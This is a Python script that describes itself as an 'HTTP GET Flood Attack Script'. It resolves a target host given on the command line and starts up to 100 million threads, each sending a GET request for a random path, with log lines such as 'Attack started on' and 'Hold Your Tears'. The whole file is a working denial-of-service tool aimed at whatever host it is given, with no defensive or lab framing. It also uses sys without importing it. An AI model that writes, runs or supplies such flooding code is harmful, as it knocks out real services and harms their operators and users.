import random
import socket  # Import the socket module to create network connections
import string  # Import the string module for generating random strings
import argparse  # Import argparse for parsing command-line arguments
import threading  # Import threading to handle multiple threads
import time  # Import time for adding delays in execution
import logging  # Import logging to provide logging capabilities

# Configure logging to output the attack progress and errors
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="HTTP GET Flood Attack Script")
    # Add an argument for the target hostname or IP address
    parser.add_argument("host", help="Target hostname or IP address")
    # Add an optional argument for the target port, defaulting to 80 if not provided
    parser.add_argument("port", type=int, nargs="?", default=80, help="Target port (default: 80)")
    # Add an optional argument for the number of requests, defaulting to 100 million if not provided
    parser.add_argument("num_requests", type=int, nargs="?", default=100000000, help="Number of requests (default: 100 million)")
    # Return the parsed arguments
    return parser.parse_args()

# Function to resolve hostname to IP address
def resolve_hostname(hostname):
    try:
        # Remove any protocol or "www." prefix from the hostname
        host = hostname.replace("https://", "").replace("http://", "").replace("www.", "")
        # Get the IP address corresponding to the hostname
        return socket.gethostbyname(host)
    except socket.gaierror:
        # Log an error message if the hostname is invalid and exit
        logging.error("Invalid hostname, please check the URL and try again.")
        sys.exit(2)

# Function to generate a random URL path
def generate_url_path():
    # Generate a random string of 5 characters (letters, digits, and punctuation) to act as a URL path
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=5))

# Function to print thread status
def print_status(thread_num):
    # Log the progress of the current thread
    logging.info(f"Thread [{thread_num}] #-#-# Hold Your Tears #-#-#")

# Function to perform the HTTP GET request
def attack(ip, port, host, thread_num):
    # Print the status of the current thread
    print_status(thread_num)
    # Generate a random URL path
    url_path = generate_url_path()
    # Create a new socket for the connection
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target IP and port
        dos.connect((ip, port))
        # Create the HTTP GET request with the generated URL path and host
        request = f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        # Send the HTTP GET request
        dos.send(request)
    except socket.error:
        # Log an error if there's a connection problem
        logging.error("Connection error, server may be down.")
    finally:
        # Shut down the socket and close it to release resources
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

# Main function to start the attack
def main():
    # Parse the command-line arguments
    args = parse_arguments()
    # Resolve the target hostname to an IP address
    ip = resolve_hostname(args.host)

    # Log the start of the attack with details of the target
    logging.info(f"Attack started on {args.host} ({ip}) || Port: {args.port} || # Requests: {args.num_requests}")

    # List to keep track of all threads
    all_threads = []
    # Create and start a thread for each request
    for i in range(args.num_requests):
        # Create a new thread for the attack function
        t1 = threading.Thread(target=attack, args=(ip, args.port, args.host, i + 1))
        # Start the thread
        t1.start()
        # Add the thread to the list of all threads
        all_threads.append(t1)
        # Introduce a slight delay between starting threads to control request rate
        time.sleep(0.01)

    # Wait for all threads to finish before exiting
    for current_thread in all_threads:
        current_thread.join()

# If this script is run directly, execute the main function
if __name__ == "__main__":
    main()
